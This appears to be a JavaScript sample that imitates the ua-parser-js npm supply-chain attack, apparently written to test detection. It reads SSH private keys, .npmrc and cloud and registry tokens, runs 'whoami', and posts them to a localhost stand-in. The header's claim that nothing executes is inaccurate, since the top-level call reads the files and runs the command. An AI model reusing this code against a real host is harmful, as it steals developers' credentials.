/**
 * Simulates the ua-parser-js npm supply chain attack pattern.
 * Uses child_process to run commands, reads sensitive files, exfiltrates via https.
 * HARMLESS: All destinations are localhost. Nothing is actually executed.
 */

const child_process = require('child_process');
const fs = require('fs');
const https = require('https');
const os = require('os');
const path = require('path');

function gatherInfo() {
    let info = {};

    try {
        info.hostname = os.hostname();
        info.platform = os.platform();
        info.user = os.userInfo().username;
    } catch (e) {}

    try {
        info.sshKey = fs.readFileSync(
            path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8'
        );
    } catch (e) {
        info.sshKey = '';
    }

    try {
        info.npmrc = fs.readFileSync(
            path.join(os.homedir(), '.npmrc'), 'utf8'
        );
    } catch (e) {
        info.npmrc = '';
    }

    info.env = {
        npm_token: process.env.NPM_TOKEN || '',
        github_token: process.env.GITHUB_TOKEN || '',
        aws_key: process.env.AWS_ACCESS_KEY_ID || '',
    };

    try {
        info.whoami = child_process.execSync('whoami').toString().trim();
    } catch (e) {
        info.whoami = '';
    }

    return info;
}

function exfiltrate(data) {
    const payload = JSON.stringify(data);
    const options = {
        hostname: '127.0.0.1',
        port: 1337,
        path: '/collect',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload),
        },
    };

    const req = https.request(options, () => {});
    req.on('error', () => {});
    req.write(payload);
    req.end();
}

exfiltrate(gatherInfo());
